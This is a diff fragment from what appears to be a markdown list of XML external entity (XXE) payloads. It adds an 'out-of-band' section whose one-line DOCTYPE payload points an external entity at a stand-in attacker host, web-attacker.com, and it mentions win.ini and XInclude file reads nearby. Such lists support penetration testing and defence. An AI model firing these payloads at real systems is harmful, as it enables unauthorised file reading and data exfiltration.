@@ -518,6 +518,11 @@ If the output of the `win.ini` file on the target returns the response message, 
 </userInfo>
 ```
 
+### XXE - Out-of-band
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]><
+```
+
 ### XXE file read via XInclude payload as parameter value 
 #### `payload`
 
